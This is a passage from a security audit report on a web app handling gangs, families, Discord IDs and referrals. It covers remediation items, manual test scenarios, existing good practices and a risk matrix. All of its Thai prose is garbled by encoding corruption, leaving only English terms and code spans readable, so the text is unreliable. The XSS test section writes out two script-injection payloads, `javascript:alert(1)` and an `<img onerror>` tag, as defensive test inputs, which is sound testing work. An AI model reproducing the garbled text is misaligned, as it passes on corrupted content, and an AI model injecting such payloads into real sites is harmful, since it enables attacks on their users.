| 9 | ‡∏ó‡∏≥‡πÉ‡∏´‡πâ Discord ID type ‡∏™‡∏≠‡∏î‡∏Ñ‡∏•‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô | ‡∏´‡∏•‡∏≤‡∏¢‡πÑ‡∏ü‡∏•‡πå | 1 ‡∏ä‡∏°. |
| 10 | ‡∏•‡πâ‡∏≤‡∏á sensitive data ‡∏à‡∏≤‡∏Å logs | API routes | 30 ‡∏ô‡∏≤‡∏ó‡∏µ |

---

## üß™ ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ó‡∏µ‡πà‡πÅ‡∏ô‡∏∞‡∏ô‡∏≥

### ‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏î‡πâ‡∏ß‡∏¢‡∏°‡∏∑‡∏≠

1. **‡∏ó‡∏î‡∏™‡∏≠‡∏ö Race Condition:**
   - ‡πÄ‡∏õ‡∏¥‡∏î 10 ‡πÅ‡∏ó‡πá‡∏ö‡∏î‡πâ‡∏ß‡∏¢‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ï‡πà‡∏≤‡∏á‡∏Å‡∏±‡∏ô
   - ‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏ô‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÅ‡∏Å‡πä‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô
   - ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤ member_count ‡πÑ‡∏°‡πà‡πÄ‡∏Å‡∏¥‡∏ô‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î

2. **‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ Referral ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î:**
   - ‡∏™‡∏£‡πâ‡∏≤‡∏á 5 ‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏à‡∏≤‡∏Å IP ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô‡∏î‡πâ‡∏ß‡∏¢‡∏£‡∏´‡∏±‡∏™ referral ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô
   - ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤ ticket count ‡πÑ‡∏°‡πà‡πÇ‡∏ï‡πÅ‡∏ö‡∏ö linear

3. **‡∏ó‡∏î‡∏™‡∏≠‡∏ö XSS:**
   - ‡∏•‡∏≠‡∏á‡∏ï‡∏±‡πâ‡∏á logo_url ‡πÄ‡∏õ‡πá‡∏ô `javascript:alert(1)`
   - ‡∏•‡∏≠‡∏á‡∏ï‡∏±‡πâ‡∏á motd ‡πÄ‡∏õ‡πá‡∏ô `<img src=x onerror=alert(1)>`

4. **‡∏ó‡∏î‡∏™‡∏≠‡∏ö Authorization:**
   - ‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà leader ‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡πÄ‡∏ï‡∏∞‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏ú‡πà‡∏≤‡∏ô API
   - ‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤ gang settings

---

## ‚úÖ ‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡∏î‡∏µ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß

1. **‚úÖ ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô SQL Injection** - ‡πÉ‡∏ä‡πâ parameterized queries ‡∏™‡∏°‡πà‡∏≥‡πÄ‡∏™‡∏°‡∏≠
2. **‚úÖ Auth ‡∏ï‡∏≤‡∏° Session** - NextAuth ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á
3. **‚úÖ ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Authorization** - ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Leader ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö action ‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç
4. **‚úÖ ‡πÉ‡∏ä‡πâ Transaction** - ‡∏°‡∏µ database transactions ‡∏û‡∏£‡πâ‡∏≠‡∏° rollback ‡πÄ‡∏°‡∏∑‡πà‡∏≠ error
5. **‚úÖ ‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö BigNumbers** - Database ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ `bigNumberStrings: true`
6. **‚úÖ Connection Pooling** - ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ pool ‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á‡∏û‡∏£‡πâ‡∏≠‡∏° limits
7. **‚úÖ ‡∏´‡πâ‡∏≤‡∏°‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏±‡πâ‡∏á‡πÅ‡∏Å‡πä‡∏á‡πÅ‡∏•‡∏∞‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß** - ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô

---

## üìä ‡∏ï‡∏≤‡∏£‡∏≤‡∏á Risk Matrix

|  | ‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡∏ï‡πà‡∏≥ | ‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á | ‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡∏™‡∏π‡∏á |
|--|------------|-----------------|-------------|
| **‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡∏™‡∏π‡∏á** | ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö input | XSS ‡∏ú‡πà‡∏≤‡∏ô fields | Race conditions |
| **‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á** | Memory leak | ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ Discord ID | ‡πÉ‡∏ä‡πâ Referral ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î |
| **‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡∏ï‡πà‡∏≥** | ‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢ logs | - | ‡∏£‡∏´‡∏±‡∏™‡∏ã‡πâ‡∏≥‡∏Å‡∏±‡∏ô |

---

> **‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÄ‡∏°‡∏∑‡πà‡∏≠:** 6 ‡∏ò‡∏±‡∏ô‡∏ß‡∏≤‡∏Ñ‡∏° 2567 03:30 ‡∏ô.  
> **‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ Review:** ‡∏ó‡∏µ‡∏°‡∏û‡∏±‡∏í‡∏ô‡∏≤  
> **‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ñ‡∏±‡∏î‡πÑ‡∏õ:** ‡∏´‡∏•‡∏±‡∏á‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç P0 ‡πÄ‡∏™‡∏£‡πá‡∏à
